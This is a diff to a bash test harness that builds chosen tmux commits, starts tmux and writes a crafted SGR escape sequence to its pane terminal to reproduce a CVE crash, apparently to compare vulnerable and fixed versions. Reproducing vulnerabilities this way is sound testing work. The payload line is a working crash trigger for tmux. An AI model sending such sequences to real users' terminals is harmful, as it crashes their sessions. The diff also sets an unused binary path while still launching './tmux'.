@@ -11,75 +11,105 @@ run_tmux_test() {
   local commit_hash="$1"
   local version_description="$2"
   local expected_outcome="$3"
-  local timeout_duration="${4:-60}" # Default: 60 seconds
+  local timeout_duration="${4:-60}" # Default to 60 seconds
 
   echo "=========================================="
   echo "Testing ${version_description} (${commit_hash})"
   echo "=========================================="
 
-  # reset to the specified version
-  git reset --hard "${commit_hash}"
+  echo "Current directory: $(pwd)"
+  echo "Fetching latest tags and objects from origin..."
+  if ! git fetch origin --tags --prune; then
+    echo "WARNING: git fetch origin --tags failed. Proceeding with reset attempt anyway."
+  fi
 
-  # build tmux from source
+  echo "Attempting to reset to commit: ${commit_hash}"
+  if ! git reset --hard "${commit_hash}"; then
+    echo "ERROR: Failed to reset to commit ${commit_hash}."
+    echo "Available tags:"
+    git tag -l | sort -V
+    echo "Recent log:"
+    git log -n 10 --oneline
+    return 1
+  fi
+  echo "Successfully reset to commit ${commit_hash}."
+
+  # Build tmux from source
   echo "Building tmux from source..."
-  sh autogen.sh && ./configure && make
-  echo "Build complete."
+  if [ ! -f "autogen.sh" ]; then
+    echo "ERROR: autogen.sh NOT FOUND in $(pwd) after git reset."
+    echo "Please check the specific commit to ensure autogen.sh is present at the root."
+    return 1
+  fi
 
+  echo "Attempting to run: sh autogen.sh && ./configure && make check && make install"
+  if sh autogen.sh && ./configure && make check && make install; then
+    echo "Build complete."
+  else
+    echo "ERROR: Build FAILED. This could be due to issues running autogen.sh, configure, or make."
+    return 1
+  fi
+  TMUX_BIN_PATH='/usr/bin/tmux' # path where tmux is stored after installation
   echo -e "\n--- Running ${version_description} and attempting to trigger CVE ---"
   echo "${expected_outcome}"
 
-  # execute tmux in the background + get its PID
   ./tmux &
   TMUX_PID=$!
   echo "tmux started with PID: $TMUX_PID"
+
   sleep 2 # Wait for tmux to start
 
-  # send exploit payload to tmux
-  echo -e '\033[::::::7::1:2:3::5:6:7:m' >"/dev/pts/$(tmux list-panes -F '#{pane_tty}' | grep -oP '\d+$' | head -n 1)"
-  sleep 1
+  local pane_tty_path
+  # Try to find the pane TTY
+  for _ in $( # Try for up to 2.5 seconds
+    seq 1 5
+  ); do
+    pane_tty_path=$(tmux list-panes -F '#{pane_tty}' 2>/dev/null | grep -oP '/dev/pts/\d+' | head -n 1)
+    if [ -n "$pane_tty_path" ] && [ -e "$pane_tty_path" ]; then
+      break
+    fi
+    sleep 0.5
+  done
 
-  echo -e "\n--- Payload sent. Waiting for tmux process with timeout of ${timeout_duration}s ---"
+  if [ -n "$pane_tty_path" ] && [ -e "$pane_tty_path" ]; then
+    echo "Sending payload to tmux pane: $pane_tty_path"
+    echo -e '\033[::::::7::1:2:3::5:6:7:m' >"$pane_tty_path"
+    sleep 1
+  else
+    echo "WARNING: Could not find active tmux pane TTY. Payload not sent."
+  fi
 
-  # in order to wait for tmux to finish, with a timeout we run a subshell
-  # that sleeps for $timeout_duration seconds, and then kills tmux if it's still running
-  (
-    sleep "$timeout_duration" &&
-      kill "$TMUX_PID" 2>/dev/null &&
-      echo "tmux (PID: $TMUX_PID) timed out and was killed."
-  ) &
+  echo -e "\n--- Payload possibly sent. Waiting for tmux process (PID: $TMUX_PID) with timeout of ${timeout_duration}s ---"
+
+  # Timeout subshell
+  (sleep "$timeout_duration" && kill "$TMUX_PID" 2>/dev/null && echo "INFO: tmux (PID: $TMUX_PID) timed out after ${timeout_duration}s and was sent SIGTERM by monitor.") &
   TIMEOUT_MONITOR_PID=$!
 
-  # Wait for the TMUX_PID to exit
+  # Wait for TMUX_PID to exit
   wait "$TMUX_PID" 2>/dev/null
   TMUX_EXIT_CODE=$?
 
-  # kill the timeout monitor if tmux exited before the timeout
-  if ps -p "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1; then # Check if TIMEOUT_MONITOR_PID is running
-    kill "$TIMEOUT_MONITOR_PID" 2>/dev/null
-    wait "$TIMEOUT_MONITOR_PID" 2>/dev/null # Clean up the timeout monitor process
-  fi
+  # Clean up the timeout monitor
+  kill "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1
+  wait "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1
 
-  # check the exit code of tmux in oreder to determine if it crashed or not
+  # Report tmux exit status
   if [ "$TMUX_EXIT_CODE" -eq 0 ]; then
-    echo "tmux (PID: $TMUX_PID) exited cleanly."
-  elif [ "$TMUX_EXIT_CODE" -eq 124 ]; then
-    # Exit code for timeout from `timeout` command (alternative)
-    echo "tmux (PID: $TMUX_PID) was killed due to timeout."
+    echo "tmux (PID: $TMUX_PID) exited cleanly (Code: 0)."
   elif [ "$TMUX_EXIT_CODE" -gt 128 ]; then
-    # Processes killed by signals have exit codes > 128
-
-    # Signal number is exit code - 128. SIGKILL is 9, so exit code is 137. SIGTERM is 15 (143)
     SIGNAL_NUMBER=$((TMUX_EXIT_CODE - 128))
-    if [ "$SIGNAL_NUMBER" -eq 9 ]; then # SIGKILL
-      echo "tmux (PID: $TMUX_PID) was killed (SIGKILL)."
-    elif [ "$SIGNAL_NUMBER" -eq 15 ]; then # SIGTERM
-      echo "tmux (PID: $TMUX_PID) was terminated (SIGTERM)."
-    else
-      echo "tmux (PID: $TMUX_PID) exited with signal $SIGNAL_NUMBER."
+    signal_name=""
+    if command -v kill >/dev/null && kill -l "$SIGNAL_NUMBER" >/dev/null 2>&1; then
+      signal_name=" ($(kill -l "$SIGNAL_NUMBER" 2>/dev/null || echo Signal $SIGNAL_NUMBER))"
+    fi
+    echo "tmux (PID: $TMUX_PID) was terminated by signal $SIGNAL_NUMBER${signal_name} (Exit Code: $TMUX_EXIT_CODE)."
+    if [[ "$TIMEOUT_MONITOR_PID" && ! $(ps -p $TIMEOUT_MONITOR_PID -o comm=) ]]; then # Check if monitor is gone (implies it might have killed tmux)
+      echo "This termination might be due to the script's timeout mechanism."
     fi
   else
     echo "tmux (PID: $TMUX_PID) exited with code $TMUX_EXIT_CODE."
   fi
 
   echo -e "\n--- ${version_description} test complete. ---"
+  return 0
 }
